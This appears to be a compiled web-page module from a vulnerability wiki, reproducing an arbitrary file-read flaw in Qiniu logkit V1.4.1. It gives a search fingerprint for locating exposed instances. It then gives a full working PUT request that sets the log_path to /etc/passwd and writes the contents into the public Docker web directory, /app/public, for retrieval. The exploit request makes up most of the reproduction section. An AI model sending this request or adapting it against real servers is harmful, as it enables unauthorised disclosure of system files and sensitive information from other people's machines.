import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as a}from"./app-58e4a7d6.js";const t={},d=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>七牛云 logkit log_path 参数可自定义读取服务器文件，配合读取的文件写入Web目录将会使攻击者读取到服务器任意文件，造成服务器敏感信息泄漏</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>七牛云 logkit V1.4.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;七牛Logkit配置文件助手&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>主页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202206281157893.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送请求包配置读取文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>PUT /logkit/configs/passwdread HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Content-Length: 356
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36

{
  &quot;name&quot;: &quot;passwdread&quot;,
  &quot;batch_interval&quot;: 1,
  &quot;collect_interval&quot;: 1,
  &quot;reader&quot;: {
    &quot;mode&quot;: &quot;file&quot;,
    &quot;log_path&quot;: &quot;/etc/passwd&quot;,
    &quot;read_from&quot;: &quot;oldest&quot;,
    &quot;datasource_tag&quot;: &quot;datasource&quot;,
    &quot;encoding&quot;: &quot;UTF-8&quot;
  },
  &quot;parser&quot;: {
    &quot;type&quot;: &quot;raw&quot;,
    &quot;name&quot;: &quot;parser&quot;,
    &quot;timestamp&quot;: &quot;true&quot;
  },
  &quot;transforms&quot;: [],
  &quot;senders&quot;: [
    {
      &quot;sender_type&quot;: &quot;file&quot;,
      &quot;file_send_path&quot;: &quot;/app/public/passwd.log&quot;
    }
  ]
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202206281157267.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202206281157819.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>请求读取的文件 /app/public 目录为Docker默认Web路径，写入可读取目标文件</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202206281157946.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,15),s=[d];function l(o,u){return i(),n("div",null,s)}const v=e(t,[["render",l],["__file","七牛云 logkit log_path 任意文件读取漏洞.html.vue"]]);export{v as default};
